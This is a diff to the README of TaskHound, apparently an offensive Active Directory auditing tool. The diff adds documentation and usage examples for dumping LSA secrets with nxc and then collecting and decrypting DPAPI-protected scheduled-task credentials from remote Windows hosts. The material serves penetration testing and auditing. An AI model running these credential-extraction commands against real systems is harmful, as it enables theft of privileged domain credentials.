@@ -7,6 +7,7 @@ TaskHound hunts for Windows scheduled tasks that run with privileged accounts an
 ## Key Features
 
 - **Tier 0 Detection**: Automatically identifies tasks running as classic Tier 0 users
+- **DPAPI Support**: Collect and decrypt DPAPI blobs from scheduled tasks
 - **BloodHound Export Integration**: Supports both Legacy BloodHound and BloodHound Community Edition (BHCE) formats
 - **Password Analysis**: Analyzes password age relative to task creation date for DPAPI dump viability
 - **Offline Analysis**: Process previously collected XML files
@@ -152,6 +153,34 @@ If there is no data found or wasn't supplied, taskhound will then try to look up
 > **WARNING**  
 > Features in this section are **UNSAFE** for production environments. Limited testing has been done in lab environments. Don't blame me if something blows up your op or gets you busted. You have been warned.
 
+### DPAPI Credential Extraction
+
+TaskHound can extract and decrypt Task Scheduler credentials stored by Windows using DPAPI. This feature supports two workflows:
+
+**Online Mode: Live Collection & Decryption**
+```bash
+# First, obtain DPAPI_SYSTEM userkey via LSA dump:
+nxc smb 192.168.1.10 -u admin -p pass --lsa
+
+# Option 1: Collect only (saves to dpapi_loot/192.168.1.10/)
+taskhound -t 192.168.1.10 -u admin -p pass -d domain --loot
+
+# Option 2: Collect + decrypt immediately (credentials shown inline with tasks)
+taskhound -t 192.168.1.10 -u admin -p pass -d domain --loot --dpapi-key 0x51e43225...
+
+# Option 3: Collect from multiple targets (WITHOUT --dpapi-key)
+taskhound --targets-file hosts.txt -u admin -p pass -d domain --loot
+# Then decrypt each target offline with its specific key
+```
+
+**Offline Mode: Decrypt Previously Collected Files**
+```bash
+# Decrypt files collected earlier with --loot:
+taskhound --offline dpapi_loot/192.168.1.10 --dpapi-key 0x51e43225...
+```
+
+> **Important**: Each target has a unique DPAPI key. The `--dpapi-key` flag can only be used with a single target, NOT with `--targets-file`. For multiple targets, use `--loot` (without `--dpapi-key`) to collect files, then decrypt each target offline with its specific key.
+
 ### Credential Guard Detection
 
 Checks remote registry for Credential Guard status to determine DPAPI dump feasibility. Results include `"credential_guard": true/false` in output.
@@ -166,7 +195,8 @@ Usage: taskhound [-h] [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [--hashes HASHES]
                  [-k] [-t TARGET] [--targets-file TARGETS_FILE] [--dc-ip DC_IP]
                  [--offline OFFLINE] [--bh-data BH_DATA] [--include-ms] 
                  [--include-local] [--include-all] [--unsaved-creds] [--no-ldap]
-                 [--credguard-detect] [--plain PLAIN] [--json JSON] [--csv CSV] 
+                 [--credguard-detect] [--loot] [--dpapi-key DPAPI_KEY]
+                 [--plain PLAIN] [--json JSON] [--csv CSV] 
                  [--backup BACKUP] [--no-summary] [--debug]
 
 Authentication:
@@ -192,11 +222,22 @@ Scanning:
   --no-ldap             Disable LDAP queries for SID resolution
   --credguard-detect    EXPERIMENTAL: Detect Credential Guard via remote registry
 
+DPAPI Operations:
+  --loot                Collect DPAPI files (masterkeys + credentials) for decryption
+                        Without --dpapi-key: saves files to dpapi_loot/<target>/
+                        With --dpapi-key: decrypts credentials immediately
+                        When combined with --backup: nests dpapi_loot/ inside backup directory
+  --dpapi-key KEY       DPAPI_SYSTEM userkey (hex format from LSA secrets dump)
+                        Use with --loot for live decryption, or with --offline for 
+                        offline decryption of previously collected files
+
 Output:
   --plain PLAIN         Save plain text output per target
   --json JSON           Export results to JSON file  
   --csv CSV             Export results to CSV file
   --backup BACKUP       Save raw XML files for offline analysis
+                        When combined with --loot: creates consolidated output directory
+                        Structure: <backup_dir>/<target>/Tasks/ and dpapi_loot/
   --no-summary          Disable summary table (shown by default)
   --debug               Enable debug output and full stack traces
 ```
@@ -212,7 +253,6 @@ When caffeine intake and free time align:
 - BloodHound DB Connector to always query the freshest BloodHound Data without the need for exports/imports
   - (Will be prioritized as it's needed for the NetExec Module)
 - Dedicated NetExec module (PR in Review)
-- Automated credential blob extraction for offline decryption
 - Support custom Tier-0 mappings instead of just the default ones
 - OpenGraph integration for attack path mapping  
 
@@ -222,9 +262,15 @@ TaskHound is strictly an **audit and educational tool**. Use only in environment
 
 ## Acknowledgement
 
-[Fortra/Impacket](https://github.com/fortra/impacket)
+[Fortra/Impacket](https://github.com/fortra/impacket) - SMB/RPC/Kerberos operations
 
-[SpecterOps/BloodHound](https://github.com/SpecterOps/BloodHound)
+[SpecterOps/BloodHound](https://github.com/SpecterOps/BloodHound) - Active Directory attack path analysis
+
+[skelsec/dpapick3](https://github.com/skelsec/dpapick3) - DPAPI decryption library and implementation reference
+
+[Pupy Project](https://github.com/n1nj4sec/pupy) - DPAPI SYSTEM masterkey decryption techniques
+
+[gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) - DPAPI operations and LSA secrets extraction research
 
 and every contributor to these projects for the amazing work they did for the community.
 
